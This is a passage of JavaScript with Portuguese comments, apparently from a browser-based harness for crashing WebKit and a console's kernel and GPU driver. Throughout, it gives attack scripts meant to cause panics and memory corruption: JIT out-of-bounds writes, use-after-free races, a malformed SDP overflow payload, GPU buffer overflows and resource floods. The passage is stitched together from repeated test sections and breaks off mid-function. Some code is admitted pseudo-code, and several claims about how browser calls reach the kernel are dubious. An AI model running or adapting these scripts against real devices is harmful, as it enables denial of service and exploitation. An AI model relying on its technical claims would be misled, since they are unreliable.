        // Lógica: Passar um endereço de memória não mapeado (ou protegido) para uma operação atómica do kernel.
        // O Kernel tenta escrever nesse endereço -> Page Fault em Kernel Mode -> Panic.
        function runUMTXPageFault() {
            log("Iniciando K1: UMTX Kernel Page Fault...");
            
            if(!window.SharedArrayBuffer) return log("[N/A] SAB off.");
            
            const sab = new SharedArrayBuffer(4096);
            const i32 = new Int32Array(sab);
            
            // Worker tenta esperar (wait) num endereço
            const w = new Worker(URL.createObjectURL(new Blob([`
                onmessage = (e) => {
                    const i32 = new Int32Array(e.data);
                    // Atomics.wait chama umtx_op no kernel
                    // Passamos timeout infinito para manter o kernel "segurando" o endereço
                    Atomics.wait(i32, 0, 0); 
                }
            `], {type:'text/javascript'})));
            
            w.postMessage(sab);
            
            // O GOLPE: Na main thread, tentamos "desligar" (neutering) a memória
            // Se o browser permitir desligar memória enquanto o kernel a usa -> Panic.
            setTimeout(() => {
                // WebKit geralmente bloqueia transfer de SAB, mas tentamos corromper a view
                // ou forçar GC agressivo
                log("Tentando invalidar memória em uso pelo Kernel...");
                try {
                    // Simulação de invalidation via postMessage transfer (falha em SAB, mas estressa o refcount)
                    const temp = new MessageChannel();
                    temp.port1.postMessage(sab);
                } catch(e){}
            }, 100);
        }

        // TEST K2: Canvas BitBlt GPU Driver Crash
        // ALVO: Driver GNM / GPU Command Buffer.
        // Lógica: BitBlt (Bit Block Transfer) de um Canvas gigante para ele mesmo com parâmetros negativos.
        // Se o driver não validar os limites, tenta ler memória VRAM inválida.
        function runCanvasBitBltCrash() {
            log("Iniciando K2: Canvas BitBlt Crash...");
            
            const c = document.createElement('canvas');
            c.width = 4096; // Tamanho crítico
            c.height = 4096;
            const ctx = c.getContext('2d');
            
            // Desenha algo para alocar backing store
            ctx.fillRect(0,0,100,100);
            
            try {
                // Cópia recursiva com coordenadas negativas extremas
                // Tenta forçar o driver a calcular um offset de memória negativo
                ctx.drawImage(c, -10000, -10000, 20000, 20000);
                
                // Força flush para a GPU
                const data = ctx.getImageData(0,0,1,1);
                log("[SAFE] GPU Driver tratou coordenadas inválidas.");
            } catch(e) {
                log("[INFO] JS Exception: " + e.message);
            }
        }

        // TEST K3: FontFace Parser Corruption
        // ALVO: FreeType (Kernel Font Module).
        // Lógica: Carregar uma fonte corrompida. O parser de fontes roda com privilégios elevados.
        // Usamos um ArrayBuffer com lixo aleatório como fonte.
        function runFontFaceFuzz() {
            log("Iniciando K3: Font Parser Fuzzing...");
            
            // Cria um buffer de fonte inválido (Fuzzing simples)
            const fontData = new Uint8Array(1024);
            for(let i=0; i<1024; i++) fontData[i] = Math.random() * 255;
            
            // Assinatura mágica OTF/TTF falsificada para passar a primeira checagem
            fontData[0] = 0x00; fontData[1] = 0x01; fontData[2] = 0x00; fontData[3] = 0x00;
            
            const font = new FontFace('CrashFont', fontData);
            
            font.load().then(() => {
                log("[???] Fonte aleatória carregou? Improvável.");
            }).catch(e => {
                log("[SAFE] Parser rejeitou a fonte (Erro: " + e.message + ")");
            });
            
            // Tenta adicionar ao documento para forçar o renderizador a tocar nela
            document.fonts.add(font);
            log("Fonte injetada no subsistema gráfico. Aguardando render...");
        }
      // ==========================================
        // WEBKIT TESTS (Userland Segfaults)
        // ==========================================

        // TEST W1: TypedArray Offset Wraparound (JIT Segfault)
        // Lógica: Cria uma view TypedArray com um offset gigante perto do limite de 32-bit ou 64-bit.
        // Se o JIT errar o cálculo do endereço final (wraparound), ele tenta acessar memória antes do buffer.
        function runTypedArrayOffsetWrap() {
            log("Iniciando W1: Offset Wraparound Crash...");
            
            const buffer = new ArrayBuffer(1024);
            
            try {
                // Offset gigante: 2^32 - 16. Se o motor usar aritmética de 32-bit assinada errada,
                // isso pode ser interpretado como offset negativo ou wrap para 0.
                // Se ele tentar somar a base do buffer, aponta para memória não mapeada.
                const badView = new Uint8Array(buffer, 0xFFFFFFF0, 16);
                
                // Trigger: Acesso à view inválida
                badView[0] = 1;
                log("[SAFE] Motor JS tratou o offset gigante (RangeError provável).");
            } catch(e) {
                log("[INFO] Erro capturado: " + e.message);
            }
            log("Se o navegador não fechou, o teste falhou.");
        }

        // TEST W2: MutationObserver Node UAF (Null Deref)
        // Lógica: Usar um observador para detectar mudanças no DOM. Dentro do callback,
        // destruir o nó que causou a mudança e forçar o motor a recalcular seu layout.
        function runMutationObserverUAF() {
            log("Iniciando W2: MutationObserver UAF...");
            
            const target = document.createElement('div');
            document.body.appendChild(target);
            target.id = "victim";
            
            const observer = new MutationObserver((mutations) => {
                // O callback roda de forma assíncrona (microtask)
                // Remove o nó do DOM
                document.body.removeChild(target);
                
                // O GOLPE: Força recálculo de estilo num nó "morto"
                // O motor C++ pode tentar acessar o objeto de renderização que já foi libertado.
                try {
                    const crash = target.clientWidth; // Force layout
                    log("[SAFE] Acesso a nó removido não crashou (Retornou 0/null).");
                } catch(e) {}
            });
            
            observer.observe(target, { attributes: true });
            
            // Trigger da mutação
            target.setAttribute('data-trigger', 'crash');
        }

        // TEST W3: Cyclic Prototype Chain JIT Stack Smash
        // Lógica: Criar um ciclo na cadeia de protótipos e forçar o JIT a percorrê-la.
        // Diferente de um erro JS "Cyclic __proto__ value", tentamos enganar o JIT para
        // entrar em recursão infinita na stack C++, colidindo com a stack guard.
        function runPrototypeCyclicCrash() {
            log("Iniciando W3: Cyclic Prototype Stack Smash...");
            
            const objA = {};
            const objB = {};
            
            objA.__proto__ = objB;
            // O motor JS geralmente impede isso com um erro.
            // Tentamos usar setters para contornar a verificação imediata.
            try {
                Object.setPrototypeOf(objB, objA); 
            } catch(e) {
                log("[INFO] Motor JS preveniu ciclo direto: " + e.message);
                // Tentativa alternativa: Proxy trap para esconder o ciclo durante a configuração
            }
            
            // Se o ciclo foi criado (por falha do motor), qualquer acesso a propriedade inexistente
            // causa loop infinito de lookup na stack C++.
            try {
                const crash = objA.nonExistentProperty;
                log("[SAFE] Ciclo prevenido ou gerido.");
            } catch(e) {}
        }

        // ==========================================
        // KERNEL TESTS (System Panics)
        // ==========================================

        // TEST K1: Misaligned Atomic Operation (Kernel Alignment Fault)
        // Lógica: Operações atómicas requerem alinhamento de memória natural (ex: 4 bytes para Int32).
        // Forçamos um acesso desalinhado num buffer partilhado. Se o hardware lançar exceção e o
        // kernel não a tratar corretamente em user mode, ocorre Panic.
        function runMisalignedAtomic() {
            log("Iniciando K1: Misaligned Atomic Panic...");
            
            if(!window.SharedArrayBuffer) return log("[N/A] SAB off.");
            
            const sab = new SharedArrayBuffer(16);
            // DataView permite acesso desalinhado
            const dv = new DataView(sab);
            
            // Offset 1 é desalinhado para Int32 (deve ser múltiplo de 4)
            const unalignedOffset = 1; 
            
            log("Tentando Atomics.add em offset desalinhado (Offset 1)...");
            try {
                // Esta operação deve disparar um CPU Alignment Fault
                Atomics.add(dv.getInt32(unalignedOffset), 0, 1); // Pseudo-código, JS puro protege isso.
                
                // Implementação real precisa de TypedArray desalinhado (difícil em JS padrão)
                // Tentamos enganar a construção:
                const unalignedView = new Int32Array(sab, 4); // Alinhado
                // Acesso fora dos limites ou tipo errado para tentar forçar o kernel
                Atomics.store(unalignedView, 0xFFFFFFFF, 1); 
                
                log("[SAFE] JS Engine preveniu acesso atómico desalinhado.");
            } catch(e) {
                log("[INFO] Erro JS capturado: " + e.message);
            }
        }

        // TEST K2: IPv6 Multicast Join/Leave Race (UAF Panic)
        // Lógica: Stressar o lock do kernel que gere grupos multicast.
        // Entrar e sair de grupos IPv6 rapidamente em muitos sockets pode causar uma race condition
        // onde o kernel tenta usar uma estrutura de grupo já libertada.
        function runSocketMulticastRace() {
            log("Iniciando K2: IPv6 Multicast Race...");
            
            const sockets = [];
            // Endereço Multicast IPv6
            const mcastAddr = "[ff02::1]"; 
            
            const iv = setInterval(() => {
                // Abre e fecha sockets rapidamente
                for(let i=0; i<5; i++) {
                    // Tenta conectar a multicast (força join/leave interno no kernel)
                    const s = new WebSocket(`ws://${mcastAddr}:80`);
                    s.close(); // Close imediato força 'leave group'
                    sockets.push(s);
                }
                
                // Limpeza para não esgotar FDs (não queremos DoS, queremos race)
                if(sockets.length > 50) sockets.length = 0;
                
            }, 5); // Intervalo muito curto para maximizar a race
            
            setTimeout(() => {
                clearInterval(iv);
                log("[INFO] Race finalizada. Se console não reiniciou, está seguro.");
            }, 2000);
        }

        // TEST K3: WebGL2 Transform Feedback Overflow (GPU Driver Panic)
        // Lógica: Usar Transform Feedback para instruir a GPU a escrever dados num buffer
        // que é menor do que a quantidade de dados gerados. O driver GPU deve prevenir isso.
        // Se falhar, a GPU sobrescreve memória do kernel/driver -> Panic.
        function runWebGLTransformFeedback() {
            log("Iniciando K3: GPU Transform Feedback Overflow...");
            
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl2');
            if (!gl) return log("[N/A] WebGL2 necessário.");
            
            // 1. Buffer de saída minúsculo (4 bytes)
            const outputBuf = gl.createBuffer();
            gl.bindBuffer(gl.TRANSFORM_FEEDBACK_BUFFER, outputBuf);
            gl.bufferData(gl.TRANSFORM_FEEDBACK_BUFFER, new Float32Array([0]), gl.DYNAMIC_READ);
            
            // Bind para índice 0
            gl.bindBufferBase(gl.TRANSFORM_FEEDBACK_BUFFER, 0, outputBuf);
            
            // 2. Shader que gera muitos dados
            const vs = gl.createShader(gl.VERTEX_SHADER);
            gl.shaderSource(vs, `#version 300 es
                out float oVal;
                void main() { oVal = float(gl_VertexID); }`);
            gl.compileShader(vs);
            
            const prog = gl.createProgram();
            gl.attachShader(prog, vs);
            // Define saída para variar 'oVal'
            gl.transformFeedbackVaryings(prog, ["oVal"], gl.SEPARATE_ATTRIBS);
            gl.linkProgram(prog);
            gl.useProgram(prog);
            
            // 3. Trigger: Tenta desenhar 1000 vértices, gerando 4000 bytes de dados
            // para um buffer que só aguenta 4 bytes.
            log("Disparando GPU Draw Call com buffer insuficiente...");
            gl.beginTransformFeedback(gl.POINTS);
            gl.drawArrays(gl.POINTS, 0, 1000);
            gl.endTransformFeedback();
            
            gl.finish(); // Força sincronização
            
            log("[SAFE] GPU Driver bloqueou o overflow ou truncou os dados.");
        }
      // ==========================================
        // WEBKIT TESTS (Userland Crash)
        // ==========================================

        // TEST W1: String.normalize ICU Heap Corruption
        // ALVO: Biblioteca ICU (International Components for Unicode).
        // Lógica: Strings Unicode malformadas podem causar erros de cálculo de buffer na normalização.
        // Se a biblioteca ICU escrever além do buffer alocado -> Heap Corruption -> Crash.
        function runUnicodeNormalizeCrash() {
            log("Iniciando W1: ICU Normalize Crash...");
            
            // Cria string com sequência Unicode problemática (combinação excessiva de acentos)
            // Isso força a expansão do buffer interno da ICU.
            let s = "\u00C5"; // 'A' com círculo
            for(let i=0; i<5000; i++) s += "\u0300"; // Adiciona 5000 acentos graves (stacking accents)
            
            try {
                // Tenta normalizar para Form C (Canonical Composition)
                // Se a implementação tiver bug de overflow no buffer temporário: CRASH.
                const res = s.normalize("NFC");
                log("[SAFE] ICU tratou a string normalizada.");
            } catch(e) {
                log("[INFO] Erro JS (RangeError provável): " + e.message);
            }
        }

        // TEST W2: AudioParam Automations Race
        // ALVO: WebAudio Engine (AudioParamTimeline).
        // Lógica: Agendar automações de áudio (setValueAtTime) e cancelar imediatamente em outra thread/loop.
        // Se o motor de áudio tentar ler o evento de automação deletado -> UAF Crash.
        function runAudioParamRace() {
            log("Iniciando W2: AudioParam Race Condition...");
            if(!window.AudioContext) return log("[N/A] WebAudio off.");
            
            const ctx = new AudioContext();
            const osc = ctx.createOscillator();
            const gain = ctx.createGain();
            osc.connect(gain);
            gain.connect(ctx.destination);
            
            // Agenda milhares de eventos
            for(let i=0; i<1000; i++) {
                gain.gain.setValueAtTime(Math.random(), ctx.currentTime + i*0.01);
                gain.gain.linearRampToValueAtTime(Math.random(), ctx.currentTime + i*0.01 + 0.005);
            }
            
            osc.start();
            
            // O GOLPE: cancelScheduledValues força limpeza da timeline
            // Fazemos isso enquanto o renderizador de áudio está processando os eventos.
            setTimeout(() => {
                try {
                    gain.gain.cancelScheduledValues(0); // Limpa tudo
                    osc.stop();
                    ctx.close(); // Destroi contexto
                } catch(e) {}
                log("[INFO] Race disparada. Se aba viva, falhou.");
            }, 10);
        }

        // TEST W3: Detached Iframe Window Access
        // ALVO: DOM Binding Security.
        // Lógica: Criar um iframe, guardar referência à sua 'window', remover o iframe do DOM.
        // Tentar acessar propriedades da 'window' desligada. Se o ponteiro interno 'm_frame' não for null-checked -> Segfault.
        function runDetachedFrameAccess() {
            log("Iniciando W3: Detached Window Pointer...");
            
            const iframe = document.createElement('iframe');
            document.body.appendChild(iframe);
            const win = iframe.contentWindow;
            
            // Remove iframe (Detach)
            document.body.removeChild(iframe);
            
            // Tenta acessar objetos profundos que dependem do Frame C++
            try {
                // Acesso a history, location ou selection em frame desligado é historicamente problemático
                const crash = win.history.length;
                const crash2 = win.getSelection(); 
                
                // Força GC para limpar o Frame C++ backing store
                const a = []; for(let i=0; i<10000; i++) a.push(new Uint8Array(1000));
                
                log("[SAFE] Acesso a janela desligada tratado (provavelmente undefined/null).");
            } catch(e) {
                log("[INFO] Exceção JS: " + e.message);
            }
        }

        // ==========================================
        // KERNEL TESTS (System Panic)
        // ==========================================

        // TEST K1: WebGL Shader Loop Unroll Overflow
        // ALVO: GPU Shader Compiler (Driver GNM).
        // Lógica: Criar um shader com loops aninhados que forçam o compilador a desenrolar (unroll) código.
        // Se o compilador do driver tentar desenrolar demais, estoura a stack do kernel/driver ou buffer de comando.
        function runShaderCompilerBomb() {
            log("Iniciando K1: GPU Shader Compiler Stack Smash...");
            
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl');
            
            // Shader com complexidade ciclomática explosiva (mas válido sintaticamente)
            // Não é loop infinito de execução, é complexidade de COMPILAÇÃO.
            const fsSource = `
                precision mediump float;
                void main() {
                    float val = 0.0;
                    for(int i=0; i<20; i++) {
                        for(int j=0; j<20; j++) {
                            for(int k=0; k<20; k++) {
                                val += sin(float(i*j*k));
                            }
                        }
                    }
                    gl_FragColor = vec4(val, 0.0, 0.0, 1.0);
                }
            `;
            
            const s = gl.createShader(gl.FRAGMENT_SHADER);
            gl.shaderSource(s, fsSource);
            
            log("Compilando Shader complexo (Pode congelar driver)...");
            gl.compileShader(s);
            
            if (!gl.getShaderParameter(s, gl.COMPILE_STATUS)) {
                log("[SAFE] Compilador rejeitou shader ou falhou graciosamente.");
                log(gl.getShaderInfoLog(s));
            } else {
                log("[SAFE] Shader compilado com sucesso.");
            }
        }

        // TEST K2: writev/readv IOVEC Length Overflow
        // ALVO: Syscall readv/writev (Kernel I/O).
        // Lógica: Criar um Blob com um número massivo de partes. Quando lido, isso vira uma estrutura `iovec` no kernel.
        // Se o número de vetores exceder `UIO_MAXIOV` (1024) e o kernel não checar, ocorre overflow no kernel heap.
        function runIOVECIntegerOverflow() {
            log("Iniciando K2: IOVEC Buffer Overflow...");
            
            // Cria array com 2048 partes (acima do limite padrão de 1024 do BSD)
            const parts = [];
            for(let i=0; i<2048; i++) parts.push(new Uint8Array([65]));
            
            const blob = new Blob(parts);
            
            const reader = new FileReader();
            reader.onload = () => log("[SAFE] Kernel lidou com IOVEC grande (Split ou Loop).");
            reader.onerror = () => log("[INFO] Erro de leitura (Provavelmente EMSGSIZE).");
            
            log("Disparando syscall readv com iovcnt > 1024...");
            reader.readAsArrayBuffer(blob);
        }

        // TEST K3: Setsockopt IP_OPTIONS Malformed Length
        // ALVO: Pilha de Rede (IP Stack).
        // Lógica: Tentar definir opções de IP com um buffer length inválido.
        // O kernel pode tentar copiar dados baseados no tamanho fornecido sem validar se o buffer JS tem esse tamanho.
        function runSCTPOptionCrash() {
            log("Iniciando K3: IP_OPTIONS Malformed Copy...");
            
            // Como não temos sockets crus (Raw Sockets) em JS, usamos WebRTC/WebSocket
            // para chegar o mais perto possível das camadas baixas.
            // Mas para simular a corrupção de 'setsockopt', atacamos a criação de ICE Candidates
            // que internamente configuram sockets.
            
            if(!window.RTCPeerConnection) return log("[N/A] WebRTC off.");
            
            const pc = new RTCPeerConnection();
            
            // Tenta passar SDP malformado que define opções de conexão estranhas
            // O parser SDP no kernel/userland pode falhar.
            const evilSDP = "v=0\r\no=- 0 0 IN IP4 0.0.0.0\r\ns=-\r\nt=0 0\r\nm=audio 1 RTP/AVP 0\r\na=fmtp:0 " + "A".repeat(5000); 
            
            log("Aplicando SDP malicioso (Buffer Overflow no Parser)...");
            pc.setRemoteDescription({type:'offer', sdp:evilSDP})
            .then(() => log("[SAFE] SDP aceito."))
            .catch(e => log("[SAFE] SDP rejeitado: " + e.message));
        }
     // ==========================================
        // WEBKIT TESTS (Userland Races)
        // ==========================================

        // TEST W1: TextDecoder SharedArrayBuffer Race
        // ALVO: Implementação de TextDecoder.
        // Lógica: TextDecoder escreve num buffer destino. Se o destino for um SharedArrayBuffer (SAB)
        // e outra thread modificar o buffer (ex: redimensionar ou escrever) DURANTE a descodificação,
        // o TextDecoder pode escrever fora dos limites.
        function runTextDecoderRace() {
            log("Iniciando W1: TextDecoder SAB Race...");
            
            if(!window.SharedArrayBuffer) return log("[N/A] SAB off.");

            const sab = new SharedArrayBuffer(1024);
            const view = new Uint8Array(sab);
            const decoder = new TextDecoder();
            const encoded = new Uint8Array(100).fill(65); // 'A's
            
            // Worker que bombardeia o SAB
            const w = new Worker(URL.createObjectURL(new Blob([`
                onmessage = (e) => {
                    const view = new Uint8Array(e.data);
                    // Tenta criar condição de corrida na memória
                    while(true) {
                        view[50] = 0; 
                        // Busy loop de escrita
                    }
                }
            `], {type:'text/javascript'})));
            
            w.postMessage(sab);
            
            try {
                // Tenta decodificar PARA dentro do SAB enquanto ele é modificado
                // API padrão: decoder.decode(input) -> string.
                // API Vulnerável (se existir): decodeInto(input, outputSAB).
                // Como decodeInto não é standard, testamos se o .decode() lê lixo do SAB.
                
                const res = decoder.decode(view); // Lê do SAB
                log("[SAFE] Decode completou sem corrupção visível.");
            } catch(e) {
                log("[INFO] Erro de decode: " + e.message);
            }
            w.terminate();
        }

        // TEST W2: Async Generator 'return' State Confusion
        // ALVO: Máquina de Estado de Generators (JSC).
        // Lógica: Forçar um AsyncGenerator a entrar num estado inválido chamando .return()
        // enquanto ele está suspenso num 'await' dentro de um bloco try/finally complexo.
        function runAsyncGeneratorConfusion() {
            log("Iniciando W2: Async Generator Logic...");
            
            async function* gen() {
                try {
                    yield 1;
                    await new Promise(r => setTimeout(r, 10)); // Suspensão
                    yield 2;
                } finally {
                    // O perigo: yield no finally durante um return() forçado
                    yield 3; 
                }
            }
            
            const g = gen();
            g.next().then(() => {
                // Força return enquanto suspenso
                // O motor deve gerir a transição para 'completed' corretamente
                // Se falhar, pode re-executar código com contexto destruído
                const ret = g.return(4);
                
                ret.then(r => {
                    if(r.value === 3) log("[SAFE] Generator respeitou a lógica do finally.");
                    else log(`[VULN] Estado confuso! Esperado 3, recebeu: ${r.value}`);
                });
            });
        }

        // TEST W3: Proxy Trap Infinite Recursion (C++ Stack Smash)
        // ALVO: Limite de Stack do WebKit.
        // Lógica: Criar um Proxy cujo trap 'get' chama a si mesmo infinitamente.
        // O objetivo não é um "Maximum call stack size exceeded" (erro JS), mas sim
        // estourar a stack C++ antes que o verificador JS perceba.
        function runProxyStackSmash() {
            log("Iniciando W3: Proxy Stack Smash...");
            
            const p = new Proxy({}, {
                get: (t, k, r) => {
                    return r[k]; // Recursão infinita via receiver
                }
            });
            
            try {
                const val = p.foo;
            } catch(e) {
                if(e.name === "RangeError") log("[SAFE] Stack Guard JS ativado.");
                else log("[INFO] Erro inesperado: " + e.message);
            }
            // Se o browser fechar sem log, foi um Stack Smash real.
        }

        // ==========================================
        // KERNEL TESTS (System Panic Races)
        // ==========================================

        // TEST K1: Blob URL Read/Revoke Race (VFS Use-After-Free)
        // ALVO: Virtual File System (VFS).
        // Lógica: Criar um Blob URL. Iniciar uma leitura (fetch/XHR) desse URL.
        // Revogar o URL (revokeObjectURL) imediatamente.
        // Se o Kernel VFS tentar acessar a estrutura do Blob depois de libertada -> UAF Panic.
        function runBlobUrlRevokeRace() {
            log("Iniciando K1: Blob VFS Race...");
            
            const blob = new Blob([new ArrayBuffer(1024*1024)]); // 1MB
            const url = URL.createObjectURL(blob);
            
            // Race: Ler e Revogar simultaneamente
            const p = fetch(url).catch(e => {}); // Leitura
            
            // Tenta acertar a janela exata onde o kernel resolve o nome mas ainda não leu os dados
            URL.revokeObjectURL(url); // Destruição
            
            p.then(() => log("[SAFE] Fetch completou ou falhou graciosamente."));
            
            // Repetir isso milhares de vezes em loop aumenta a chance de sucesso
            log("[INFO] Race disparada. Monitorando estabilidade do sistema...");
        }

        // TEST K2: WebGL2 Indirect Draw Buffer Race (GPU Panic)
        // ALVO: Driver GPU (GNM) e Command Processor.
        // Lógica: 'drawElementsIndirect' lê os argumentos de desenho de um BUFFER na GPU, não da CPU.
        // Se modificarmos esse buffer (via bufferSubData) enquanto a GPU está prestes a ler...
        // Podemos fazer a GPU desenhar 99999999 vértices de um buffer pequeno -> GPU Memory Corruption.
        function runWebGLIndirectDrawRace() {
            log("Iniciando K2: WebGL Indirect Draw Race...");
            
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl2');
            if(!gl) return log("[N/A] WebGL2 off.");
            
            // Buffer de argumentos (Count, InstanceCount, FirstIndex, BaseVertex, BaseInstance)
            const args = new Int32Array([0, 1, 0, 0, 0]); // Count 0 (Seguro)
            const buf = gl.createBuffer();
            gl.bindBuffer(gl.DRAW_INDIRECT_BUFFER, buf);
            gl.bufferData(gl.DRAW_INDIRECT_BUFFER, args, gl.DYNAMIC_DRAW);
            
            // Loop de Race
            let frames = 0;
            function loop() {
                if(frames++ > 100) return log("[SAFE] GPU Driver sobreviveu à race.");
                
                // 1. Envia comando de desenho
                gl.drawArraysIndirect(0); // Lê do buffer
                
                // 2. Modifica o buffer IMEDIATAMENTE para valores perigosos
                // Count = 1 milhão (Overflow se lido)
                gl.bufferSubData(gl.DRAW_INDIRECT_BUFFER, 0, new Int32Array([1000000]));
                
                // 3. Restaura para seguro
                gl.bufferSubData(gl.DRAW_INDIRECT_BUFFER, 0, new Int32Array([0]));
                
                requestAnimationFrame(loop);
            }
            loop();
        }

        // TEST K3: Signal Stack Overlap Probe
        // ALVO: Gestão de Memória Virtual do Kernel.
        // Lógica: Tentar alocar memória que colide com a "Signal Stack" (usada para handlers de erro).
        // Se conseguirmos sobrescrever a stack de sinais, quando ocorrer um erro (ex: divisão por zero),
        // o kernel salta para um endereço controlado por nós.
        function runSigAltStackOverlap() {
            log("Iniciando K3: Signal Stack Probe...");
            
            // Tentativa de alocação em endereços altos (comum para stacks) via WebAssembly
            if(!window.WebAssembly) return log("[N/A] Wasm off.");
            
            try {
                // Tenta alocar memória máxima permitida
                const mem = new WebAssembly.Memory({initial: 1000, maximum: 65536}); // ~64MB a 4GB
                log("[INFO] Wasm Memory alocada. Verificando integridade...");
                
                // Se o Kernel não implementou ASLR ou Guard Pages corretamente,
                // esta alocação pode estar adjacente a estruturas críticas.
                // Não há feedback visual direto exceto se o sistema ficar instável.
                log("[SAFE] Alocação permitida pelo Kernel sem Panic.");
            } catch(e) {
                log("[INFO] Alocação bloqueada (Limite de recurso ou proteção): " + e.message);
            }
        }
       // ==========================================
        // WEBKIT TESTS (Userland)
        // ==========================================

        // TEST W1: JIT 'PutByVal' Large Index OOB
        // ALVO: DFG JIT (Data Flow Graph).
        // Lógica: O JIT otimiza a escrita em arrays (PutByVal). Se usarmos um índice muito grande
        // que confunda a análise de range, o JIT pode escrever fora do buffer do array,
        // corrompendo o cabeçalho do próximo objeto no Heap.
        function runPutByValOOB() {
            log("Iniciando W1: JIT PutByVal OOB...");
            
            const arr = [1.1];
            
            function target(a, i, val) {
                // Escrita direta. O JIT tenta remover o bounds check se 'i' parecer seguro.
                a[i] = val;
            }
            
            // 1. Treina o JIT com índices pequenos
            for(let i=0; i<20000; i++) target(arr, 0, 1.1);
            
            // 2. O GOLPE: Passa um índice gigante
            // Se o JIT não desotimizar corretamente, ele escreve no offset 10000 * 8 bytes
            try {
                target(arr, 10000, 2.2); 
                
                // Se chegamos aqui e o array não cresceu "legalmente" (sparse), houve corrupção silenciosa
                // ou o motor lidou via slow path.
                if (arr.length === 10001) {
                    log("[SAFE] Array cresceu normalmente (Slow Path).");
                } else {
                    log("[VULN] Comportamento indefinido na escrita.");
                }
            } catch(e) {
                log("[INFO] Erro JS: " + e.message);
            }
        }

        // TEST W2: Arguments Object Escape
        // ALVO: Stack Frame & Scope Analysis.
        // Lógica: O objeto 'arguments' em funções não-estritas é mágico.
        // Se o fizermos "escapar" (atribuir a global) enquanto o JIT destrói o frame da função,
        // podemos ter acesso a memória da stack que já foi reutilizada (Use-After-Return).
        function runArgumentsEscape() {
            log("Iniciando W2: Arguments Escape...");
            
            let leakedArgs = null;
            
            function victim(a, b, c) {
                // Força criação do objeto arguments mas tenta confundir a análise de escape
                if (a > 10000) {
                    leakedArgs = arguments; // Escape no caminho frio
                }
            }
            
            // Otimiza caminho quente (sem escape)
            for(let i=0; i<20000; i++) victim(1, 2, 3);
            
            // Trigger escape
            victim(20000, 2, 3);
            
            if (leakedArgs && leakedArgs[0] === 20000) {
                // Tenta acessar depois que a função retornou
                // Se houve otimização de "stack allocation" para arguments, isso agora aponta para lixo
                const val = leakedArgs[0];
                log("[SAFE] Arguments recuperado com valor correto.");
            } else {
                log("[WARN] Falha ao vazar arguments.");
            }
        }

        // TEST W3: HTMLAudioElement GC Race
        // ALVO: Gestão de Memória DOM/Media.
        // Lógica: Criar um elemento de áudio, iniciar carregamento, e remover todas as referências JS.
        // O Garbage Collector tenta limpar o objeto JS, mas a thread de C++ (loading) tenta escrever no objeto.
        function runMediaElementUAF() {
            log("Iniciando W3: Media Element GC Race...");
            
            function trigger() {
                // Escopo local para permitir GC
                const audio = new Audio();
                // URL que demora a responder ou falha
                audio.src = "http://localhost:9999/slow-response"; 
                audio.onerror = () => { /* Callback pode ser chamado pós-morte */ };
                // Nenhuma referência global mantida
            }
            
            // Cria pressão de memória para forçar GC imediato
            trigger();
            const trash = [];
            for(let i=0; i<10000; i++) trash.push(new Uint8Array(1000));
            
            log("[INFO] Audio criado e abandonado. Aguardando GC vs Network Race...");
        }

        // ==========================================
        // KERNEL TESTS (System/Driver)
        // ==========================================

        // TEST K1: Wasm Memory Grow/Unmap Race
        // ALVO: Kernel VM Map (mmap/munmap).
        // Lógica: WebAssembly.Memory.grow() chama mmap/mremap no kernel.
        // Se, ao mesmo tempo, transferirmos o buffer para um Worker (que chama munmap no thread original),
        // podemos confundir o gestor de memória virtual do FreeBSD, criando buracos ou sobreposições.
        function runWasmGrowRace() {
            log("Iniciando K1: Wasm VM Map Race...");
            
            if(!window.WebAssembly) return log("[N/A] Wasm off.");
            
            const mem = new WebAssembly.Memory({initial: 1, maximum: 100});
            
            const w = new Worker(URL.createObjectURL(new Blob([`
                onmessage = (e) => {
                    // Recebe memória (Neutering na main thread)
                    postMessage("done");
                }
            `], {type:'text/javascript'})));
            
            // Race: Grow vs Transfer
            try {
                // Agenda transfer
                setTimeout(() => w.postMessage(mem, [mem.buffer]), 0);
                
                // Spamma grow
                for(let i=0; i<10; i++) {
                    try { mem.grow(1); } catch(e){}
                }
            } catch(e) {}
            
            log("[INFO] Race de Memória Virtual disparada.");
        }

        // TEST K2: WebRTC ICE Candidate List Overflow
        // ALVO: Pilha de Rede (Heap do Kernel).
        // Lógica: Adicionar candidatos ICE (endereços de rede) infinitamente.
        // O kernel armazena isso numa lista ligada ou array. Se não houver limite,
        // esgota o Heap do Kernel (Panic "Out of Kmem") ou corrompe a estrutura se houver integer overflow no contador.
        function runICECandidateOverflow() {
            log("Iniciando K2: ICE Candidate Overflow...");
            
            if(!window.RTCPeerConnection) return log("[N/A] WebRTC off.");
            
            const pc = new RTCPeerConnection();
            
            // Gera milhares de candidatos falsos
            const candidate = {
                candidate: "candidate:1 1 UDP 12345678 127.0.0.1 12345 typ host",
                sdpMid: "0",
                sdpMLineIndex: 0
            };
            
            let count = 0;
            const iv = setInterval(() => {
                for(let i=0; i<100; i++) {
                    pc.addIceCandidate(candidate).catch(e=>{});
                    count++;
                }
                if(count > 5000) {
                    clearInterval(iv);
                    pc.close();
                    log("[SAFE] 5000 Candidatos adicionados sem Panic.");
                }
            }, 10);
            
            log("Inundando Kernel com estruturas de rede...");
        }

        // TEST K3: Clock Drift Side-Channel
        // ALVO: Kernel Interrupt Handling.
        // Lógica: Mede a diferença entre Date.now() (Userland) e performance.now() (High Res).
        // Sob carga, se o kernel atrasar o tratamento de interrupções de relógio,
        // o "Drift" (desvio) aumenta. Isso revela atividade escondida do kernel.
        function runClockDriftProbe() {
            log("Iniciando K3: Clock Drift Probe...");
            
            const baseDate = Date.now();
            const basePerf = performance.now();
            
            // Gera carga leve
            const arr = new Uint8Array(1000000).fill(1);
            
            setTimeout(() => {
                const curDate = Date.now();
                const curPerf = performance.now();
                
                const deltaDate = curDate - baseDate;
                const deltaPerf = curPerf - basePerf;
                
                const drift = Math.abs(deltaDate - deltaPerf);
                
                log(`Drift: ${drift.toFixed(3)}ms (Date vs Perf)`);
                
                if (drift > 2.0) {
                    log("[WARN] Desvio de relógio alto! Interrupções de kernel atrasadas.");
                } else {
                    log("[SAFE] Relógios sincronizados.");
                }
            }, 1000);
        }
       // ==========================================
        // WEBKIT TESTS (Userland Crash)
        // ==========================================

        // TEST W1: Object.assign Proxy Re-entrancy
        // ALVO: JIT Object Allocation.
        // Lógica: Object.assign tenta copiar propriedades rapidamente. Se a fonte for um Proxy,
        // podemos executar código durante a cópia. Se alterarmos a forma (Shape) do objeto destino
        // de "Inline" para "Dictionary" durante a cópia, o motor escreve no offset errado.
